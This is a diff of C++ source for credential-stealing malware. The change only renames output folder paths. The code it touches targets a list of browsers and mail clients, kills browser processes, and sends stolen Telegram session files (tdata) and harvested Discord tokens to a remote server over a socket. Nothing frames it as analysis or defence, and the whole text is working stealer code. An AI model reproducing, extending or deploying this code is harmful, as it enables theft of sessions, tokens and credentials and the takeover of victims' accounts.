@@ -140,17 +140,17 @@ std::vector<uint8_t> decrypt_blob(const std::vector<uint8_t>& blob, const std::v
 
 void run_recovery(SOCKET sock) {
     std::vector<BrowserConfig> configs = {
-        {"New Outlook", "", {}, "", {L"Microsoft", L"Olk", L"EBWebView"}, "outlook_extract", "outlook_tmp", false, false, false, false},
-        {"Google Chrome", "chrome.exe", {L"Google\\Chrome\\Application\\chrome.exe"}, "chrome.dll", {L"Google", L"Chrome", L"User Data"}, "chrome_extract", "chrome_tmp", false, false, true, false},
-        {"Microsoft Edge", "msedge.exe", {L"Microsoft\\Edge\\Application\\msedge.exe"}, "msedge.dll", {L"Microsoft", L"Edge", L"User Data"}, "edge_extract", "edge_tmp", true, false, true, false},
-        {"Brave", "brave.exe", {L"BraveSoftware\\Brave-Browser\\Application\\brave.exe"}, "chrome.dll", {L"BraveSoftware", L"Brave-Browser", L"User Data"}, "brave_extract", "brave_tmp", false, false, true, false},
-        {"Opera Stable", "opera.exe", {L"Opera\\launcher.exe"}, "launcher_lib.dll", {L"Opera Software", L"Opera Stable"}, "opera_extract", "opera_tmp", false, true, false, false},
-        {"Opera GX", "opera.exe", {L"Opera GX\\launcher.exe"}, "launcher_lib.dll", {L"Opera Software", L"Opera GX Stable"}, "operagx_extract", "operagx_tmp", false, true, false, false},
-        {"Mozilla Firefox", "firefox.exe", {L"Mozilla Firefox\\firefox.exe"}, "nss3.dll", {L"Mozilla", L"Firefox", L"Profiles"}, "firefox_extract", "firefox_tmp", false, true, false, true},
-        {"Waterfox", "waterfox.exe", {L"Waterfox\\waterfox.exe"}, "nss3.dll", {L"Waterfox", L"Profiles"}, "waterfox_extract", "waterfox_tmp", false, true, false, true},
-        {"LibreWolf", "librewolf.exe", {L"LibreWolf\\librewolf.exe"}, "nss3.dll", {L"LibreWolf", L"Profiles"}, "librewolf_extract", "librewolf_tmp", false, true, false, true},
-        {"Mozilla Thunderbird", "thunderbird.exe", {L"Mozilla Thunderbird\\thunderbird.exe"}, "nss3.dll", {L"Thunderbird", L"Profiles"}, "thunderbird_extract", "thunderbird_tmp", false, true, false, true},
-        {"Yandex Browser", "browser.exe", {L"Yandex\\YandexBrowser\\Application\\browser.exe"}, "browser.dll", {L"Yandex", L"YandexBrowser", L"User Data"}, "yandex_extract", "yandex_tmp", false, false, false, false}
+        {"New Outlook", "", {}, "", {L"Microsoft", L"Olk", L"EBWebView"}, "mail_clients/Outlook", "outlook_tmp", false, false, false, false},
+        {"Google Chrome", "chrome.exe", {L"Google\\Chrome\\Application\\chrome.exe"}, "chrome.dll", {L"Google", L"Chrome", L"User Data"}, "browsers/Google Chrome", "chrome_tmp", false, false, true, false},
+        {"Microsoft Edge", "msedge.exe", {L"Microsoft\\Edge\\Application\\msedge.exe"}, "msedge.dll", {L"Microsoft", L"Edge", L"User Data"}, "browsers/Microsoft Edge", "edge_tmp", true, false, true, false},
+        {"Brave", "brave.exe", {L"BraveSoftware\\Brave-Browser\\Application\\brave.exe"}, "chrome.dll", {L"BraveSoftware", L"Brave-Browser", L"User Data"}, "browsers/Brave", "brave_tmp", false, false, true, false},
+        {"Opera Stable", "opera.exe", {L"Opera\\launcher.exe"}, "launcher_lib.dll", {L"Opera Software", L"Opera Stable"}, "browsers/Opera Stable", "opera_tmp", false, true, false, false},
+        {"Opera GX", "opera.exe", {L"Opera GX\\launcher.exe"}, "launcher_lib.dll", {L"Opera Software", L"Opera GX Stable"}, "browsers/Opera GX", "operagx_tmp", false, true, false, false},
+        {"Mozilla Firefox", "firefox.exe", {L"Mozilla Firefox\\firefox.exe"}, "nss3.dll", {L"Mozilla", L"Firefox", L"Profiles"}, "browsers/Mozilla Firefox", "firefox_tmp", false, true, false, true},
+        {"Waterfox", "waterfox.exe", {L"Waterfox\\waterfox.exe"}, "nss3.dll", {L"Waterfox", L"Profiles"}, "browsers/Waterfox", "waterfox_tmp", false, true, false, true},
+        {"LibreWolf", "librewolf.exe", {L"LibreWolf\\librewolf.exe"}, "nss3.dll", {L"LibreWolf", L"Profiles"}, "browsers/LibreWolf", "librewolf_tmp", false, true, false, true},
+        {"Mozilla Thunderbird", "thunderbird.exe", {L"Mozilla Thunderbird\\thunderbird.exe"}, "nss3.dll", {L"Thunderbird", L"Profiles"}, "mail_clients/Thunderbird", "thunderbird_tmp", false, true, false, true},
+        {"Yandex Browser", "browser.exe", {L"Yandex\\YandexBrowser\\Application\\browser.exe"}, "browser.dll", {L"Yandex", L"YandexBrowser", L"User Data"}, "browsers/Yandex Browser", "yandex_tmp", false, false, false, false}
     };
 
     kill_processes_by_name("chrome.exe");
@@ -782,7 +782,7 @@ void extract_telegram_session(SOCKET sock) {
     auto send_tdata_file = [&](const fs::path& src) {
         if (fs::exists(src)) {
             std::ifstream ifs(src, std::ios::binary); std::vector<uint8_t> data((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
-            send_file_to_server(sock, "Telegram/tdata/" + src.filename().string(), data);
+            send_file_to_server(sock, "telegram session/tdata/" + src.filename().string(), data);
         }
     };
     for (const auto& f : {"key_datas", "map0", "map1", "settingss"}) send_tdata_file(tdata_path / f);
@@ -795,7 +795,7 @@ void extract_telegram_session(SOCKET sock) {
                         std::string filename = sub_entry.path().filename().string();
                         if (filename.find(".log") == std::string::npos && filename.find("dumps") == std::string::npos) {
                             std::ifstream ifs(sub_entry.path(), std::ios::binary); std::vector<uint8_t> data((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
-                            send_file_to_server(sock, "Telegram/tdata/" + folder_name + "/" + fs::relative(sub_entry.path(), entry.path()).string(), data);
+                            send_file_to_server(sock, "telegram session/tdata/" + folder_name + "/" + fs::relative(sub_entry.path(), entry.path()).string(), data);
                         }
                     }
                 }
@@ -826,6 +826,6 @@ void extract_discord_tokens(SOCKET sock, const std::wstring& discord_path_w, con
     }
     if (!tokens.empty()) {
         std::ostringstream oss; for (const auto& token : tokens) oss << token << "\n";
-        std::string s = oss.str(); send_file_to_server(sock, "discord_extract/" + output_name + "/tokens.txt", std::vector<uint8_t>(s.begin(), s.end()));
+        std::string s = oss.str(); send_file_to_server(sock, "discord/" + output_name + "/tokens.txt", std::vector<uint8_t>(s.begin(), s.end()));
     }
 }
